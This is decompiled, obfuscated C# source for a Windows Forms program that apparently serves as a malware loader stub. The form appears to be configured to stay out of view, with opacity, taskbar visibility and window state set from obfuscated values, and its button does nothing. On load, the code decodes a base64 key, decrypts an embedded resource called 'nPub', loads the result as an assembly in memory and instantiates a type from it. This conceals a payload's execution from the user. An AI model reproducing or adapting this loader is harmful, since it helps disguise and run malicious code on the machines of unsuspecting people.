using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns1;

namespace ___codefort;

[DesignerGenerated]
public sealed class GForm0 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon notifyIcon_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("Button1")]
	private Button button_0;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar progressBar_0;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox pictureBox_0;

	internal virtual NotifyIcon NotifyIcon_0
	{
		get
		{
			return notifyIcon_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			notifyIcon_0 = value;
		}
	}

	internal virtual TextBox TextBox_0
	{
		get
		{
			return textBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			textBox_0 = value;
		}
	}

	internal virtual Button Button_0
	{
		get
		{
			return button_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button_0_Click;
			if (button_0 != null)
			{
				((Control)button_0).remove_Click(eventHandler);
			}
			button_0 = value;
			if (button_0 != null)
			{
				((Control)button_0).add_Click(eventHandler);
			}
		}
	}

	internal virtual ProgressBar ProgressBar_0
	{
		get
		{
			return progressBar_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			progressBar_0 = value;
		}
	}

	internal virtual PictureBox PictureBox_0
	{
		get
		{
			return pictureBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			pictureBox_0 = value;
		}
	}

	public GForm0()
	{
		((Form)this).add_Load((EventHandler)GForm0_Load);
		method_0();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_0()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		icontainer_0 = new Container();
		NotifyIcon_0 = new NotifyIcon(icontainer_0);
		TextBox_0 = new TextBox();
		Button_0 = new Button();
		ProgressBar_0 = new ProgressBar();
		PictureBox_0 = new PictureBox();
		((ISupportInitialize)PictureBox_0).BeginInit();
		((Control)this).SuspendLayout();
		NotifyIcon_0.set_Text(Class9.smethod_0(220));
		NotifyIcon_0.set_Visible((byte)Class7.smethod_0(48) != 0);
		TextBox obj = TextBox_0;
		Point location = new Point(Class7.smethod_0(52), Class7.smethod_0(56));
		((Control)obj).set_Location(location);
		((Control)TextBox_0).set_Name(Class9.smethod_0(243));
		TextBox obj2 = TextBox_0;
		Size size = new Size(Class7.smethod_0(60), Class7.smethod_0(64));
		((Control)obj2).set_Size(size);
		((Control)TextBox_0).set_TabIndex(Class7.smethod_0(68));
		Button obj3 = Button_0;
		location = new Point(Class7.smethod_0(72), Class7.smethod_0(76));
		((Control)obj3).set_Location(location);
		((Control)Button_0).set_Name(Class9.smethod_0(260));
		Button obj4 = Button_0;
		size = new Size(Class7.smethod_0(80), Class7.smethod_0(84));
		((Control)obj4).set_Size(size);
		((Control)Button_0).set_TabIndex(Class7.smethod_0(88));
		((ButtonBase)Button_0).set_Text(Class9.smethod_0(260));
		((ButtonBase)Button_0).set_UseVisualStyleBackColor((byte)Class7.smethod_0(92) != 0);
		ProgressBar obj5 = ProgressBar_0;
		location = new Point(Class7.smethod_0(96), Class7.smethod_0(100));
		((Control)obj5).set_Location(location);
		((Control)ProgressBar_0).set_Name(Class9.smethod_0(275));
		ProgressBar obj6 = ProgressBar_0;
		size = new Size(Class7.smethod_0(104), Class7.smethod_0(108));
		((Control)obj6).set_Size(size);
		((Control)ProgressBar_0).set_TabIndex(Class7.smethod_0(112));
		PictureBox obj7 = PictureBox_0;
		location = new Point(Class7.smethod_0(116), Class7.smethod_0(120));
		((Control)obj7).set_Location(location);
		((Control)PictureBox_0).set_Name(Class9.smethod_0(300));
		PictureBox obj8 = PictureBox_0;
		size = new Size(Class7.smethod_0(124), Class7.smethod_0(128));
		((Control)obj8).set_Size(size);
		PictureBox_0.set_TabIndex(Class7.smethod_0(132));
		PictureBox_0.set_TabStop((byte)Class7.smethod_0(136) != 0);
		SizeF autoScaleDimensions = new SizeF(Class7.smethod_2(140), Class7.smethod_2(144));
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)Class7.smethod_0(148));
		size = new Size(Class7.smethod_0(152), Class7.smethod_0(156));
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)PictureBox_0);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar_0);
		((Control)this).get_Controls().Add((Control)(object)Button_0);
		((Control)this).get_Controls().Add((Control)(object)TextBox_0);
		((Control)this).set_Name(Class9.smethod_0(323));
		((Form)this).set_Opacity(Class7.smethod_3(160));
		((Form)this).set_ShowInTaskbar((byte)Class7.smethod_0(168) != 0);
		((Form)this).set_WindowState((FormWindowState)Class7.smethod_0(172));
		((ISupportInitialize)PictureBox_0).EndInit();
		((Control)this).ResumeLayout((byte)Class7.smethod_0(176) != 0);
		((Control)this).PerformLayout();
	}

	private void Button_0_Click(object sender, EventArgs e)
	{
	}

	public void method_1(string string_0)
	{
		Activator.CreateInstance(AppDomain.CurrentDomain.Load(Class8.smethod_0(Resources.nPub, string_0)).GetType(Class6.string_0));
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		method_1(Encoding.Default.GetString(Convert.FromBase64String(Class9.smethod_0(332))));
	}
}
